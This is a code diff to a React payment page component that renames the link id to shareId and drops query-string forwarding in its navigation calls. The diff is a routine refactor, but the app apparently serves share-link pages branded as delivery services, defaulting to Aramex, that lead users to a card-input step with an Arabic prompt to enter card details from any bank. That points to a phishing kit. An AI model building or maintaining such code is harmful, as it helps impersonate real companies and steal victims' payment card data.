@@ -11,11 +11,11 @@ import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 
 const PaymentBankSelector = () => {
-  const { id } = useParams();
+  const { id: rawIdParam } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading: linkLoading } = useLink(id);
-  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
+  const shareId = rawIdParam || "";
+  const { data: linkData, isLoading: linkLoading } = useLink(shareId);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -37,14 +37,6 @@ const PaymentBankSelector = () => {
   const serviceKey = linkData?.payload?.service_key || linkData?.payload?.service || urlServiceKey || customerInfo.serviceKey || sessionServiceKey || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const serviceQuery = useMemo(() => {
-    const params = new URLSearchParams(initialSearch || "");
-    if (serviceKey) {
-      params.set('service', serviceKey);
-    }
-    const search = params.toString();
-    return search ? `?${search}` : "";
-  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
@@ -88,7 +80,7 @@ const PaymentBankSelector = () => {
       description: "يمكنك إدخال بيانات البطاقة من أي بنك",
     });
     
-    navigate(`/pay/${id}/card-input${serviceQuery}`);
+    navigate(`/pay/${shareId}/card-input`);
   };
   
   const handleContinue = () => {
@@ -97,7 +89,7 @@ const PaymentBankSelector = () => {
       sessionStorage.setItem('selectedCountry', countryCode);
       sessionStorage.setItem('selectedBank', selectedBank);
       
-      navigate(`/pay/${id}/card-input${serviceQuery}`);
+      navigate(`/pay/${shareId}/card-input`);
     }
   };
   
@@ -145,7 +137,7 @@ const PaymentBankSelector = () => {
         {/* Header */}
         <div className="mb-6">
           <button
-            onClick={() => navigate(`/pay/${id}/details${serviceQuery}`)}
+            onClick={() => navigate(`/pay/${shareId}/details`)}
             className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-4"
           >
             <ArrowLeft className="w-4 h-4" />
